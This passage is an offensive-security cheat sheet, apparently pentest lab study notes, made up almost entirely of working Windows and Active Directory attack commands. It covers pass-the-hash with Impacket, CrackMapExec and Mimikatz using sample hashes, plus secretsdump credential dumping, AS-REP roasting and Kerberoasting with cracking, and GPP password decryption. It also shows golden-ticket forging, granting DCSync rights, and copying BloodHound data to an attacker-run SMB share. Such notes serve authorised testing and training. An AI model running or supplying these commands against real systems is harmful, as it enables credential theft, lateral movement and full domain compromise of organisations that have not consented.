            WMIExec:  python3 wmiexec.py domain.local/user@10.0.0.20 -hashes aad3b435b51404eeaad3b435b51404ee:BD1C6503987F8FF006296118F359FA79  \\  sudo python3 wmiexec.py -hashes :f6084ca1a4905c45747d4bdcc1fcab84 daisy@10.11.1.122
            *CrackMapExec:  crackmapexec smb 10.0.0.20 -u user -H BD1C6503987F8FF006296118F359FA79 -d domain.local [-x ipconfig]  \\  sudo crackmapexec ldap 10.11.1.120/29 -u daisy -H f6084ca1a4905c45747d4bdcc1fcab84
            SMBClient:  smbclient //10.0.0.30/Finance -U user --pw-nt-hash BD1C6503987F8FF006296118F359FA79 -W domain.local  \\  python smbclient.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 ignite/Administrator@192.168.1.105  \\  pth-smbclient -U ignite/Administrator%00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 //192.168.1.105/c$
            ATExec:  python3 atexec.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 Administrator@192.168.1.105 cmd.exe
            Mount the Share: generate Kerberos ticket first (https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/)
        Port 3389 (Windows 2012 R2, 8.1): Restricted Admin Mode needs to be enabled (https://edermi.github.io/post/2018/native_rdp_pass_the_hash/)
            xfreerdp /u:offsec /d:win2012 /pth:2892d26cdf84d7a70e2eb3b9f05c425e /v:192.168.2.102
            Mimikatz/Mstsc:  sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the user's ntlm hash> /run:"mstsc.exe /restrictedadmin"
            Might need to enable first:  crackmapexec smb 10.0.0.200 -u Administrator -H 8846F7EAEE8FB117AD06BDD830B7586C -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
        Port 5985/5986:
            ruby evil-winrm.rb -i 10.0.0.20 -u user -H BD1C6503987F8FF006296118F359FA79
        Through Kerberos Ticket:
            Create TGT:  python3 getTGT.py -hashes aad3b435b51404eeaad3b435b51404ee:B65039D1C0359FA797F88FF06296118F domain.local/user; cp user.ccache /tmp/krb5cc_0; export KRB5CCNAME=/tmp/krb5cc_0
            SSH connect:  ssh -o GSSAPIAuthentication=yes user@domain.local -vv; cp user.ccache /tmp/krb5cc_1045; ssh -o GSSAPIAuthentication=yes user@domain.local
        From Windows:
            Mimikatz:  privilege::debug; sekurlsa::pth /user:Administrator /domain:ignite.local /ntlm:32196B56FFE6F45E294117B91A83BF38 [/run:powershell.exe]
            Powershell:  Invoke-WMIExec -Target 192.168.1.105 -Domain ignite -Username Administrator -Hash 32196B56FFE6F45E294117B91A83BF38 -Command "cmd /c mkdir c:\hacked" -Verbose
            CMD:  wmiexec.exe -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 ignite/Administrator@192.168.1.105
    Other PTH Techniques:
        LDAP:  https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/
        Generate Kerberos Ticket > follow-on attacks - https://www.n00py.io/2020/12/alternative-ways-to-pass-the-hash-pth/
            -Mount SMB Share
            -Use Kerberos ticket to SSH to Linux box
        Read/Modify Registry:
            python3 reg.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 ignite/Administrator@192.168.1.105 query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s
        Enum Users:  python3 lookupsid.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 ignite/Administrator@192.168.1.105  \\  python3 samrdump.py -hashes 00000000000000000000000000000000:32196B56FFE6F45E294117B91A83BF38 ignite/Administrator@192.168.1.105

    Other Credential Methods:
        UAC Bypass:  https://github.com/k4sth4/UAC-bypass
        Impersonation/elevation:  runas /user:domain\username cmd.exe
        Powershell Invoke-Command:
            With creds, running powershell as a user (using a credential object and invoke-command) (ex. https://0xdf.gitlab.io/2020/04/25/htb-control.html)
            $password=ConvertTo-SecureString "PlainTextPassword" -AsPlainText -Force
            $cred=New-Object System.Management.Automation.PSCredential("username",$password)
            Invoke-Command -ComputerName Server01 -Credential $cred -ScriptBlock { Get-Culture }
        Enumeration:
            Secretsdump:
                python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -just-dc-ntlm egotisticalbank/svc_loanmgr@10.10.10.175
                With Creds/Hash:
                    python3 secretsdump.py ituser@10.0.0.40 -hashes aad3b435b51404eeaad3b435b51404ee:BD1C6503987F8FF006296118F359FA79
                    python3 secretsdump.py svc-alfresco:s3rvice@10.10.10.161  
  
### Active Directory:
  
      Enumeration:
          net user
          net user /domain
          net user jeff_admin /domain  -> check groups
          net group /domain
        
        Modern approach using LDAP://HostName[:PortNumber][/DistinguishedName]:
        hostname: in PS:  [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        **PS Script that collects all users and their attributes:
            $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $PDC = ($domainObj.PdcRoleOwner).Name
            $SearchString = "LDAP://"
            $SearchString += $PDC + "/"
            $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
            $SearchString += $DistinguishedName
            $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
            $objDomain = New-Object System.DirectoryServices.DirectoryEntry
            $Searcher.SearchRoot = $objDomain
            $Searcher.filter="samAccountType=805306368"
            $Result = $Searcher.FindAll()
            Foreach($obj in $Result)
            {
             Foreach($prop in $obj.Properties)
             {
             $prop
             }

             Write-Host "------------------------"
            }
        Resolving Nested Groups:
            to list groups, change last lines of script to:
            $Searcher.SearchRoot = $objDomain
            $Searcher.filter="(objectClass=Group)"
            $Result = $Searcher.FindAll()
            Foreach($obj in $Result)
            {
             $obj.Properties.name
            }
            to list members in a group, change to $Searcher.filter="(name=Secret_Group)"    and  $obj.Properties.member
        Currently Logged on Users:
            Import-Module .\PowerView.ps1
             Get-NetLoggedon -ComputerName client123
            DC sessions:  Get-NetSession -ComputerName dc01
        Enumeration through Service Principal Names:
            ex. looking for web servers, update script:  $Searcher.filter="serviceprincipalname=*http*"
                 nslookup CorpWebServer.corp.com
    Lateral Movement:
        Pass the Hash for NTLM
        Overpass the Hash to get kerberos ticket
        Pass the Ticket
        Distributed Component Object Model (DCOM)
    Persistence:
        Golden Tickets
        Domain Controller Synchronization

    Active Directory Recon/Connecting:
        especially for domain controllers with smb, ldap, kerberos, etc.:  enum4linux 10.10.10.161  (gets usernames)
        ldapsearch -x -b "dc=cascade,dc=local" -H ldap://10.10.10.10
        rpcclient -U "" -N 10.10.10.161
          enumdomusers
          enumdomgroups
          querygroup 0x200 (see admin group members)
            querygroupmem 0x200
              queryuser 0x1f4
          querydispinfo
        (checking if username exists) Try to get user hashes, use GetNPUsers.py: for user in $(cat users); do python3 GetNPUsers.py -no-pass -dc-ip 10.10.10.193 fabricorp.local/${user} | grep -v Impacket; done
          crack hash: hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt --force
          Then connect with evil-winrm--try password and hash

    Decrypting cpassword/GPP with gpp-decrypt:  gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
      then:  smbclient //10.10.10.100/Users -U SVC_TGS
      After getting user creds, then do Kerberoasting if ports are there (https://0xrick.github.io/hack-the-box/active/)
        1. add domain to /etc/hosts
        2. get admin Kerberos ticket:  python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request active.htb/SVC_TGS
        3. crack:  ./john admin.txt --wordlist=/usr/share/wordlists/rockyou.txt
        4. connect:  python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator@active.htb

    Active Directory Recon/Suggestions with BloodHound:
      Run SharpHound.exe on victim to get data, then analyze it locally with BloodHound
        File transfer back to Kali with: python3 /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support -username df -password df  on Kali
          victim:  net use \\10.10.14.18\share /u:df df,  copy 20191018035324_BloodHound.zip \\10.10.14.18\share\,  net use /d \\10.10.14.18\share
      Run BloodHound on kali:  first:  neo4j console    then:  set up password in http://localhost:7474/browser/  then:  ./BloodHound --no-sandbox
        drag zip sharphound file into window
        See groups and path to admin.
        Account Operators lets us create a new account and add to most groups.
        add to a group:  net group "Exchange Windows Permissions" svc-alfresco /add /domain
        Transfer PowerView.ps1 file to get the commands
        One liner ex.:   Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members svc-alfresco; $username = "htb\svc-alfresco"; $password = "s3rvice"; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync
          member of, write-dacl

    Kerberos Attacks:
        https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a
        Get Known User TGTs:  python GetNPUsers.py -dc-ip 192.168.1.105 ignite.local/ -usersfile users -format john -outputfile hashes
            All Users (creds req):  python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
            Crack:  john --wordlist=/usr/share/wordlists/rockyou.txt hashes  \\  hashcat -m 18200 -a 0 <AS_REP_responses_file> <passwords_file>
        Get Service Principal Names:  python GetUserSPNs.py -request -dc-ip 192.168.1.105 ignite.local/yashika  \\  python GetUserSPNs.py <domain_name>/<domain_user>:<domain_user_password> -outputfile <output_TGSs_file>  \\  .\Rubeus.exe kerberoast /outfile:<output_TGSs_file>
            Crack:  john --format=krb5tgs --wordlist=<passwords_file> <AS_REP_responses_file>  \\  hashcat -m 13100 --force <TGSs_file> <passwords_file>
        Create Ticket:  python ticketer.py -nthash f3bc61e97fb14d18c42bcbf6c3a9055f -domain-sid S-1-5-21-3523557010-2506964455-2614950430 -domain ignite.local raj
        Convert kirbi/ccache ticket:  python ticketConverter.py raj.ccache ticket.kirbi
        Request TGT:  python getTGT.py -dc-ip 192.168.1.105 -hashes :64fbae31cc352fc26af97cbdef151e03 ignite.local/yashika
            Get Shell:  export KRB5CCNAME=yashika.ccache; psexec.py -dc-ip 192.168.1.105 -target-ip 192.168.1.105 -no-pass -k ignite.local/yashika@WIN-S0V7KMTVLD2.ignite.local
        Dump AD User info:  python3 GetADUSers.py [-all \\ -all-users] ignite.local/Administrator:Ignite@987 -dc-ip 192.168.1.105
